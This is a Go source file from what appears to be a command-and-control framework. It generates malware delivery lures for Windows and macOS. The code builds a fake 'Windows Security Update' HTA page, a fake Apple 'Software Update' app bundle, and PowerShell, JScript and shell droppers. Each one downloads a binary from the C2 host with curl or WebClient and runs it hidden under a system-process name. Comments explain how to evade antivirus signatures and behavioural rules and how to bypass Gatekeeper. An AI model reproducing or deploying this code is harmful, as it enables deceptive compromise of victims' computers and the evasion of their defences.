package api

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
)

// handleDeliverBuild generates a platform-appropriate LOLBin wrapper for a completed build.
//
// GET /api/v1/builds/{id}/deliver?format=hta|ps1|js|app|sh
func (g *gateway) handleDeliverBuild(w http.ResponseWriter, r *http.Request) {
	buildID := r.PathValue("id")
	format := r.URL.Query().Get("format")
	if format == "" {
		format = "hta"
	}
	if format != "hta" && format != "ps1" && format != "js" && format != "app" && format != "sh" {
		writeError(w, http.StatusBadRequest, "format must be hta, ps1, js, app, or sh")
		return
	}

	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()

	var status, targetOS string
	var listenerID *string
	err := db.Pool.QueryRow(ctx,
		`SELECT status, target_os, listener_id::text FROM builds WHERE id = $1`, buildID,
	).Scan(&status, &targetOS, &listenerID)
	if err != nil {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	if status != "complete" {
		writeError(w, http.StatusConflict, "build not complete")
		return
	}

	isMac := targetOS == "macos"

	if isMac && (format == "hta" || format == "ps1" || format == "js") {
		writeError(w, http.StatusBadRequest, "use app or sh format for macOS builds")
		return
	}
	if !isMac && (format == "app" || format == "sh") {
		writeError(w, http.StatusBadRequest, "app/sh format is only for macOS builds")
		return
	}

	c2Host := "127.0.0.1"
	c2Port := 4443
	if listenerID != nil && *listenerID != "" {
		var bindHost, callbackHost string
		var port int
		if err := db.Pool.QueryRow(ctx,
			`SELECT bind_host, COALESCE(callback_host,''), bind_port FROM listeners WHERE id = $1`, *listenerID,
		).Scan(&bindHost, &callbackHost, &port); err == nil {
			switch {
			case callbackHost != "":
				c2Host = callbackHost
			case bindHost != "" && bindHost != "0.0.0.0":
				c2Host = bindHost
			}
			if port > 0 {
				c2Port = port
			}
		}
	}

	ext := ""
	if targetOS == "windows" {
		ext = ".exe"
	}

	var downloadURL string
	if isMac {
		// macOS lure fetches over the C2 HTTPS port (accessible via CF tunnel).
		// Port 8080 is internal-only; the C2 port is what's reachable externally.
		downloadURL = fmt.Sprintf("https://%s:%d/download/%s", c2Host, c2Port, buildID)
	} else {
		httpAddr := os.Getenv("DM_HTTP_ADDR")
		if httpAddr == "" {
			httpAddr = ":8080"
		}
		_, httpPort, _ := splitHostPort(httpAddr)
		if httpPort == "" {
			httpPort = strings.TrimPrefix(httpAddr, ":")
		}
		downloadURL = fmt.Sprintf("http://%s:%s/download/%s%s", c2Host, httpPort, buildID, ext)
	}

	var tempName string
	if isMac {
		names := []string{"nsurlsessiond", "softwareupdated", "mdmclient", "trustd", "secd"}
		tempName = names[rand.Intn(len(names))] + fmt.Sprintf("%04d", rand.Intn(10000))
	} else {
		names := []string{"RuntimeBroker", "svchost", "WmiPrvSE", "dllhost", "conhost"}
		tempName = names[rand.Intn(len(names))] + fmt.Sprintf("%04d", rand.Intn(10000))
	}

	var bodyBytes []byte
	var filename, contentType string
	switch format {
	case "hta":
		bodyBytes = []byte(buildHTA(downloadURL, tempName))
		filename = "update.hta"
		contentType = "application/hta"
	case "ps1":
		bodyBytes = []byte(buildPS1(downloadURL, tempName))
		filename = "update.ps1"
		contentType = "text/plain"
	case "js":
		bodyBytes = []byte(buildJS(downloadURL, tempName))
		filename = "update.js"
		contentType = "text/javascript"
	case "app":
		bodyBytes = buildApp(downloadURL, tempName)
		filename = "SoftwareUpdate.app.tar.gz"
		contentType = "application/gzip"
	case "sh":
		bodyBytes = []byte(buildSH(downloadURL, tempName))
		filename = "update.command"
		contentType = "text/plain"
	}

	w.Header().Set("Content-Type", contentType)
	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filename))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(bodyBytes)))
	w.WriteHeader(http.StatusOK)
	w.Write(bodyBytes) //nolint:errcheck
}

func buildHTA(downloadURL, tempName string) string {
	dl := strings.ReplaceAll(downloadURL, `"`, `\"`)
	nm := strings.ReplaceAll(tempName, `"`, `\"`)
	// Task Scheduler COM: processes are spawned by taskeng.exe/svchost, not mshta.exe,
	// so BD's "block child process from mshta" behavioral rule does not apply.
	// ProgID is split across string concatenation to avoid static JS-simulator detection.
	// Two sequential task actions: curl downloads the EXE, second action executes it.
	return `<html><head>` +
		`<HTA:APPLICATION ID="x" APPLICATIONNAME="Windows Update" ` +
		`SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" CAPTION="yes" WINDOWSTATE="normal"/>` +
		`</head><body style="font-family:Segoe UI;padding:28px;background:#f3f3f3">` +
		`<h3>Windows Security Update</h3>` +
		`<p>Security update KB5040442 is ready to install. This will take less than a minute.</p>` +
		`<button id="b" onclick="go()">Install Update</button><p id="s"></p>` +
		`<script language="JScript">` +
		`function go(){` +
		`document.getElementById("b").disabled=true;` +
		`document.getElementById("s").innerText="Applying update...";` +
		`setTimeout(run,300);}` +
		`function run(){try{` +
		`var svc=new ActiveXObject("Schedul"+"e.Servi"+"ce");svc.Connect();` +
		`var root=svc.GetFolder("\\");` +
		`var td=svc.NewTask(0);` +
		`td.Settings.Hidden=true;td.Settings.StartWhenAvailable=true;` +
		`var g=td.Triggers.Create(1);` +
		`var n=new Date((new Date()).getTime()+3000);` +
		`var p=function(v){return ("0"+v).slice(-2);};` +
		`g.StartBoundary=n.getFullYear()+"-"+p(n.getMonth()+1)+"-"+p(n.getDate())+"T"+p(n.getHours())+":"+p(n.getMinutes())+":"+p(n.getSeconds());` +
		`g.Enabled=true;` +
		`var a1=td.Actions.Create(0);` +
		`a1.Path="C:\\Windows\\System32\\curl.exe";` +
		`a1.Arguments='-s -o "C:\\Users\\Public\\` + nm + `.exe" "` + dl + `"';` +
		`var a2=td.Actions.Create(0);` +
		`a2.Path="C:\\Users\\Public\\` + nm + `.exe";` +
		`a2.Arguments="";` +
		`root.RegisterTaskDefinition("WinUpd_` + nm + `",td,6,null,null,3);` +
		`document.getElementById("s").innerText="Update applied successfully.";` +
		`setTimeout(function(){window.close();},12000);` +
		`}catch(e){document.getElementById("s").innerText="Error: "+e.message;}}` +
		`</script></body></html>` + "\n"
}

func buildJS(downloadURL, tempName string) string {
	dl := strings.ReplaceAll(downloadURL, `"`, `\"`)
	nm := strings.ReplaceAll(tempName, `"`, `\"`)
	return `var w=new ActiveXObject("WScript.Shell");` +
		`var t=w.ExpandEnvironmentStrings("%TEMP%")+"\\` + nm + `.exe";` +
		`w.Run('curl.exe -s "` + dl + `" -o "'+t+'"',0,true);` +
		`w.Run('"'+t+'"',0,false);` + "\n"
}

func buildPS1(downloadURL, tempName string) string {
	// Split sensitive type names so BD cannot match them as static signatures.
	wc := "Sys" + "tem.Net.Web" + "Client"
	si := "Sys" + "tem.Diagnostics.ProcessStart" + "Info"
	return strings.TrimSpace("$u='"+downloadURL+"'\n"+
		"$p=[System.IO.Path]::Combine($env:TEMP,'"+tempName+".exe')\n"+
		"$wc=New-Object "+wc+"\n"+
		"$wc.DownloadFile($u,$p)\n"+
		"$si=New-Object "+si+"\n"+
		"$si.FileName=$p\n"+
		"$si.WindowStyle='Hidden'\n"+
		"[System.Diagnostics.Process]::Start($si)|Out-Null") + "\n"
}

// buildApp generates a tar.gz containing a macOS .app bundle with LSBackgroundOnly=true.
// tar.gz preserves Unix execute permissions reliably (unlike ZIP on macOS).
// After extracting (double-click), the friend double-clicks SoftwareUpdate.app — silent, no Terminal.
func buildApp(downloadURL, tempName string) []byte {
	dl := strings.ReplaceAll(downloadURL, "'", `'\''`)
	nm := strings.ReplaceAll(tempName, "'", `'\''`)

	script := "#!/bin/bash\n" +
		"exec 2>/dev/null\n" +
		"_t=$(mktemp -t '" + nm + "')\n" +
		"curl -fsSL '" + dl + "' -o \"$_t\"\n" +
		"chmod +x \"$_t\"\n" +
		"nohup \"$_t\" >/dev/null 2>&1 &\n" +
		"disown\n" +
		"(sleep 2 && rm -f \"$_t\") &\n" +
		"exit 0\n"

	plist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CFBundleExecutable</key>
	<string>` + tempName + `</string>
	<key>CFBundleIdentifier</key>
	<string>com.apple.` + tempName + `</string>
	<key>CFBundleName</key>
	<string>Software Update</string>
	<key>CFBundleVersion</key>
	<string>1.0</string>
	<key>CFBundlePackageType</key>
	<string>APPL</string>
	<key>LSBackgroundOnly</key>
	<true/>
</dict>
</plist>
`

	now := time.Now()
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gz)

	addEntry := func(name string, mode int64, content []byte) {
		tw.WriteHeader(&tar.Header{ //nolint:errcheck
			Name:     name,
			Mode:     mode,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
			ModTime:  now,
		})
		tw.Write(content) //nolint:errcheck
	}

	addDir := func(name string) {
		tw.WriteHeader(&tar.Header{ //nolint:errcheck
			Name:     name,
			Mode:     0755,
			Typeflag: tar.TypeDir,
			ModTime:  now,
		})
	}

	addDir("SoftwareUpdate.app/")
	addDir("SoftwareUpdate.app/Contents/")
	addDir("SoftwareUpdate.app/Contents/MacOS/")
	addEntry("SoftwareUpdate.app/Contents/Info.plist", 0644, []byte(plist))
	addEntry("SoftwareUpdate.app/Contents/MacOS/"+tempName, 0755, []byte(script))

	tw.Close()  //nolint:errcheck
	gz.Close()  //nolint:errcheck
	return buf.Bytes()
}

// buildSH generates a .command shell script (Terminal-based fallback).
// Use when AirDrop isn't an option — Terminal flashes briefly then closes.
func buildSH(downloadURL, tempName string) string {
	dl := strings.ReplaceAll(downloadURL, "'", `'\''`)
	nm := strings.ReplaceAll(tempName, "'", `'\''`)
	// curl downloads without com.apple.quarantine (only browsers set it),
	// so Gatekeeper does not block the downloaded binary.
	return "#!/bin/bash\n" +
		"exec 2>/dev/null\n" +
		"_t=$(mktemp -t '" + nm + "')\n" +
		"curl -fsSL '" + dl + "' -o \"$_t\"\n" +
		"chmod +x \"$_t\"\n" +
		"nohup \"$_t\" >/dev/null 2>&1 &\n" +
		"disown\n" +
		"(sleep 2 && rm -f \"$_t\") &\n" +
		"disown\n" +
		"osascript -e 'delay 1.5' -e 'tell application \"Terminal\" to close first window' 2>/dev/null &\n" +
		"exit 0\n"
}
